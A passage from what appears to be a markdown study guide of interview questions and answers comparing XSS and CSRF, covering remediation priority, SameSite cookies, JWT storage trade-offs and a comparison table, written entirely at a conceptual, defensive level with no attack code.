> "XSS, without hesitation. There are three reasons. First, XSS is strictly more powerful — it can do everything CSRF can do, plus read data, steal credentials, and maintain persistent access. Second, XSS defeats CSRF protections — if XSS exists, CSRF tokens, SameSite cookies, and custom headers are all bypassed. Third, modern browsers have significantly reduced CSRF risk through default SameSite=Lax behavior, whereas there's no equivalent browser-level XSS mitigation that works without developer effort.
>
> That said, in practice, you should always fix both. Defense-in-depth requires addressing each vulnerability class independently."

### Q4: "How does SameSite=Lax help with CSRF but not XSS?"

**Answer:**

> "SameSite=Lax tells the browser not to send cookies with cross-site POST requests, iframes, or AJAX calls — only with top-level GET navigations. This prevents CSRF because the attacker's malicious page (a different site) triggers a cross-site POST that won't include the session cookie.
>
> But SameSite does nothing for XSS because an XSS payload executes on the *same site*. From the browser's perspective, the malicious JavaScript is part of the trusted application. All cookie restrictions based on site boundaries are satisfied because there is no cross-site boundary being crossed."

### Q5: "A penetration test found both XSS and CSRF in your application. How do you prioritize remediation?"

**Answer:**

> "I would prioritize XSS remediation first, because:
>
> 1. **XSS nullifies CSRF defenses.** As long as XSS exists, adding CSRF tokens provides no real protection — the XSS script can extract and use them.
> 2. **XSS has broader impact.** Beyond performing actions, XSS enables data exfiltration, credential theft, session hijacking, and persistent compromise.
> 3. **XSS is harder to fix retroactively.** It requires systematic output encoding across every rendering context, which is more complex than adding CSRF tokens to forms.
>
> For the XSS fixes, I'd prioritize stored XSS over reflected XSS (stored affects all visitors, reflected requires individual targeting). Then I'd add CSRF protections as a second phase, along with deploying SameSite=Lax on all session cookies as a quick interim measure.
>
> I'd also deploy CSP in report-only mode immediately to gain visibility into injection vectors while the fixes are being implemented."

### Q6: "Can CSRF steal data?"

**Answer:**

> "No. CSRF is fundamentally a blind, write-only attack. The attacker can force the victim's browser to send a request, but the same-origin policy prevents the attacker from reading the response. The attacker can cause state changes — transfer money, change an email, delete records — but cannot directly read the response containing account balances, personal information, or other data.
>
> There is one exception: if the application returns sensitive data in response to a GET request, and the data is in a format that can be parsed cross-origin (like JSONP or certain JavaScript array/object formats), then a CSRF-like attack could exfiltrate data. This is technically a cross-origin data leakage issue rather than classical CSRF, but it uses similar mechanics."

### Q7: "Your application uses a REST API with JWT tokens in the Authorization header (not cookies). Is it vulnerable to CSRF?"

**Answer:**

> "No, it is not vulnerable to traditional CSRF. CSRF relies on the browser *automatically* attaching credentials to requests. Cookies are sent automatically; Authorization headers are not. If the JWT is stored in localStorage and explicitly added to each request via JavaScript, the browser will not include it in cross-origin form submissions or image loads.
>
> However, there are related risks. If the JWT is stored in a cookie (sometimes done for SSR or to avoid localStorage XSS exposure), then CSRF is back in play. Also, regardless of CSRF, the JWT in localStorage is vulnerable to theft via XSS. So the authentication architecture trades CSRF immunity for increased XSS sensitivity."

---

## Quick Comparison Matrix

| Dimension | XSS | CSRF |
|-----------|-----|------|
| **Full name** | Cross-Site Scripting | Cross-Site Request Forgery |
| **CWE ID** | CWE-79 | CWE-352 |
| **OWASP Top 10 (2021)** | A03: Injection | A01: Broken Access Control |
| **Trust exploited** | User trusts the website | Website trusts the user's browser |
| **Attack vector** | Script injection into web pages | Forged requests from external pages |
| **Execution context** | Client-side (victim's browser) | Server-side (processes forged request) |
| **Requires authentication** | No (but more impactful if authenticated) | Yes (depends on session cookies) |
| **Can read data** | Yes (DOM, cookies, APIs, localStorage) | No (blind/write-only) |
| **Can modify data** | Yes | Yes (the primary goal) |
| **Can steal credentials** | Yes (keyloggers, fake forms, cookie theft) | No |
| **Persistence** | Stored XSS persists; Reflected/DOM are transient | One-time per victim interaction |
| **Victim interaction** | View page (stored) or click link (reflected) | Visit attacker's page |
| **Same-origin policy** | Bypassed (code runs within trusted origin) | Enforced (cannot read cross-origin responses) |
| **Primary defense** | Output encoding | Synchronizer tokens |
| **Secondary defenses** | CSP, Trusted Types, framework escaping | SameSite cookies, custom headers, origin validation |
| **Impact on other defenses** | XSS defeats CSRF protections | CSRF cannot bypass XSS defenses |
| **Browser evolution** | No significant automatic protection | SameSite=Lax default dramatically reduces risk |
| **Severity (typical)** | Higher (more versatile, data exfil) | Lower (blind, action-only) |
| **Testing complexity** | High (many contexts, encoding rules) | Moderate (systematic token checking) |
| **Fix complexity** | High (systematic encoding across codebase) | Moderate (add token framework) |
| **Automated detection** | Good (scanners, SAST) | Good (missing token detection) |
| **Worm potential** | Yes (Samy worm, TweetDeck) | No (cannot self-propagate) |

---

## Cross-Links

- **[XSS (Cross-Site Scripting)](../XSS/XSS.md)** — deep dive into all XSS types, payloads, and defenses
- **[Cookie Security / HttpOnly and Secure Cookies](../Cookie%20Security/HttpOnly%20and%20Secure%20cookies.md)** — SameSite, HttpOnly, Secure, cookie prefixes
- **[Security Headers](../Security%20Headers/Security%20Headers.md)** — CSP, HSTS, X-Frame-Options, and other response headers
- **[Session Fixation and Session Hijacking](../Session%20Fixation%20and%20Session%20Hijacking/Session%20Fixation%20and%20Session%20Hijacking.md)** — session management attacks and defenses
- **[Web Application Security Vulnerabilities](../Web%20Application%20Security%20Vulnerabilities/Web%20Application%20Security%20Vulnerabilities.md)** — broader web security context
- **[XSS vs CSRF - Interview Questions & Answers](XSS%20vs%20CSRF%20-%20Interview%20Questions%20&%20Answers.md)** — focused Q&A format
- **[XSS vs CSRF - Quick Reference](XSS%20vs%20CSRF%20-%20Quick%20Reference.md)** — one-page summary
- **[Critical Clarification: XSS vs CSRF Misconceptions](Critical%20Clarification%20XSS%20vs%20CSRF%20Misconceptions.md)** — common mistakes and corrections
